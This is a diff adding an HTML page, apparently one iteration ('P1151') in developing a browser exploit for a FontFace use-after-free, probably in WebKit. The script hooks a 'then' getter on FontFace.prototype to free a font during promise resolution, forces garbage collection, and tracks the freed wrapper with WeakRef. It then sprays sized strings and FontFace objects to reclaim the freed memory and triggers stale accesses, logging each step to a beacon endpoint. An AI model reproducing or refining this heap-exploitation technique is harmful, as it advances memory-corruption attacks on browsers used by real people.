@@ -1,0 +1,222 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1151</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1151: THENABLE REJECT — BREAK PROMISE REF CHAIN ===');
+log('info','P1150v2 showed wrapper stays ALIVE because promise holds FontFace');
+log('info','Fix: return thenable function, call reject(Error) so promise holds Error not FontFace');
+B('P1151-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var weakFF=null;
+var hasWR=(typeof WeakRef!=='undefined');
+var hasFR=(typeof FinalizationRegistry!=='undefined');
+var frFired=false;
+var fr=null;
+
+// Setup FinalizationRegistry if available
+if(hasFR){
+  try{
+    fr=new FinalizationRegistry(function(tag){
+      frFired=true;
+      B('P1151-FR-FIRED','tag='+tag+'|t='+Date.now());
+      log('win','FinalizationRegistry: FontFace wrapper COLLECTED! tag='+tag);
+    });
+  }catch(e){hasFR=false;}
+}
+B('P1151-FEATURES','weakref='+hasWR+'|finreg='+hasFR);
+
+// Create font
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+// Register for GC notification BEFORE dropping ref
+if(hasWR)weakFF=new WeakRef(ff);
+if(fr)try{fr.register(ff,'fontface-'+r);}catch(e){B('P1151-FR-ERR',e.message);}
+
+// === KEY CHANGE: Return a THENABLE FUNCTION that REJECTS ===
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;
+  uafHit=true;
+  B('P1151-THEN','fired');
+
+  var self=this;
+  // Return a function — makes FontFace "thenable"
+  // Promise resolution will call this function with (resolve, reject)
+  return function(resolve,reject){
+    B('P1151-THENABLE','called');
+    // Free the font
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(self);}catch(e){}
+    document.body.offsetHeight;
+    // Clear local ref to FontFace
+    self=null;
+    // REJECT with Error — promise settles with Error, NOT FontFace
+    // This breaks the reference chain!
+    reject(new Error('freed'));
+  };
+},set:function(){}});
+
+// Drop strong ref — only WeakRef + FinalizationRegistry remain
+ff=null;
+
+// Trigger font loading (this will check then getter)
+document.fonts.load('1em y'+r+', z'+r,'AB').then(
+  function(){B('P1151-RESOLVE','unexpected');},
+  function(e){B('P1151-REJECT','msg='+e.message);}
+);
+
+// === Phase 1: Quick check at 200ms ===
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  B('P1151-P1','hit='+uafHit);
+  if(!uafHit){B('P1151-DONE','nohit');return;}
+
+  var wr1='no_wr';
+  if(weakFF){try{var d=weakFF.deref();wr1=d?'alive':'collected';}catch(e){wr1='err';}}
+  B('P1151-P1-WR',wr1);
+  log('info','Phase 1 (200ms): WeakRef='+wr1+' FR='+frFired);
+},200);
+
+// === Phase 2: Check at 2 seconds + GC pressure ===
+setTimeout(function(){
+  // GC pressure round 1
+  for(var g=0;g<5000;g++){var tmp={x:new Array(50)};tmp=null;}
+  for(var g=0;g<3000;g++){var tmp2=new ArrayBuffer(256);tmp2=null;}
+
+  var wr2='no_wr';
+  if(weakFF){try{var d=weakFF.deref();wr2=d?'alive':'collected';}catch(e){wr2='err';}}
+  B('P1151-P2-WR',wr2+'|fr='+frFired);
+  log('info','Phase 2 (2s): WeakRef='+wr2+' FR='+frFired);
+
+  if(wr2==='collected'){
+    B('P1151-COLLECTED-EARLY','phase=2');
+    doSprayAndCheck();
+  }
+},2000);
+
+// === Phase 3: Check at 5 seconds + heavy GC ===
+setTimeout(function(){
+  // Heavy GC pressure
+  var bigTrash=[];
+  for(var g=0;g<1000;g++)bigTrash.push(new ArrayBuffer(4096));
+  bigTrash=null;
+  for(var g=0;g<10000;g++){var tmp=String(g).repeat(100);tmp=null;}
+  for(var g=0;g<5000;g++){var tmp2={a:new Array(200)};tmp2=null;}
+
+  var wr3='no_wr';
+  if(weakFF){try{var d=weakFF.deref();wr3=d?'alive':'collected';}catch(e){wr3='err';}}
+  B('P1151-P3-WR',wr3+'|fr='+frFired);
+  log('info','Phase 3 (5s): WeakRef='+wr3+' FR='+frFired);
+
+  if(wr3==='collected'){
+    B('P1151-COLLECTED-5S','phase=3');
+    doSprayAndCheck();
+  }
+},5000);
+
+// === Phase 4: Final check at 8 seconds ===
+setTimeout(function(){
+  // More GC
+  for(var g=0;g<3000;g++){var tmp=new ArrayBuffer(1024);tmp=null;}
+
+  var wr4='no_wr';
+  if(weakFF){try{var d=weakFF.deref();wr4=d?'alive':'collected';}catch(e){wr4='err';}}
+  B('P1151-P4-WR',wr4+'|fr='+frFired);
+
+  // If STILL alive, report and try fonts.check anyway
+  var chk='';
+  try{chk=document.fonts.check('1em y'+r);}catch(e){chk='err';}
+
+  if(wr4==='alive'){
+    log('fail','Phase 4 (8s): STILL ALIVE. Thenable reject did not help.');
+    // Read wrapper properties to confirm
+    if(weakFF){
+      try{
+        var alive=weakFF.deref();
+        if(alive){
+          var stat='',fam='';
+          try{stat=alive.status;}catch(e){stat='ERR';}
+          try{fam=alive.family;}catch(e){fam='ERR';}
+          B('P1151-WRAPPER','status='+stat+'|family='+fam);
+        }
+      }catch(e){}
+    }
+  }else if(wr4==='collected'){
+    log('win','Phase 4: COLLECTED! Attempting reclaim...');
+    doSprayAndCheck();
+  }
+
+  B('P1151-SUMMARY','p1wr='+wr1val+'|p4wr='+wr4+'|fr='+frFired+'|check='+chk);
+  B('P1151-DONE','complete');
+},8000);
+
+var wr1val='?';
+// Capture Phase 1 result for summary
+setTimeout(function(){
+  if(weakFF){try{var d=weakFF.deref();wr1val=d?'alive':'collected';}catch(e){wr1val='err';}}
+},250);
+
+var sprayDone=false;
+function doSprayAndCheck(){
+  if(sprayDone)return;
+  sprayDone=true;
+  log('win','!!! FontFace wrapper COLLECTED — spraying strings !!!');
+  B('P1151-SPRAY-START','t='+Date.now());
+
+  // String spray targeting 192B bmalloc zone
+  // StringImpl: ~24B header + chars, so 168 chars = ~192B for 8-bit strings
+  var strSpray=[];
+  var sizes=[160,164,168,172,176,180];
+  for(var s=0;s<sizes.length;s++){
+    var sz=sizes[s];
+    for(var k=0;k<100;k++){
+      var base='X'+s+'K'+k+'_';
+      strSpray.push(base+String.fromCharCode(65+(k%26)).repeat(sz-base.length));
+    }
+  }
+  B('P1151-SPRAY','count='+strSpray.length);
+
+  // Now trigger stale CSSFontFace access via fonts.check
+  var chk1='';
+  try{chk1=document.fonts.check('1em y'+r);}catch(e){chk1='ERR:'+e.message.substring(0,30);}
+  B('P1151-STALE-CHECK','check='+chk1);
+  log('info','fonts.check after spray: '+chk1);
+
+  // Try rendering with the freed font
+  var el=document.createElement('span');
+  el.textContent='ABCDEF';
+  el.style.fontFamily='"y'+r+'",monospace';
+  document.body.appendChild(el);
+  document.body.offsetHeight;
+  // Check computed font
+  var comp='';
+  try{comp=getComputedStyle(el).fontFamily;}catch(e){comp='ERR';}
+  B('P1151-RENDER','computed='+comp);
+  el.remove();
+
+  // FontFace spray — same type reclaim
+  var ffSpray=[];
+  var wts=['100','200','300','400','500','600','700','800','900'];
+  for(var k=0;k<90;k++){
+    try{
+      var nf=new FontFace('sp'+r+'x'+k,'local(Arial)',{weight:wts[k%9]});
+      ffSpray.push(nf);
+    }catch(e){}
+  }
+  B('P1151-FF-SPRAY','count='+ffSpray.length);
+
+  // Try fonts.check again after FontFace spray
+  var chk2='';
+  try{chk2=document.fonts.check('1em y'+r);}catch(e){chk2='ERR:'+e.message.substring(0,30);}
+  B('P1151-STALE-CHECK2','check='+chk2);
+}
+</script></body></html>
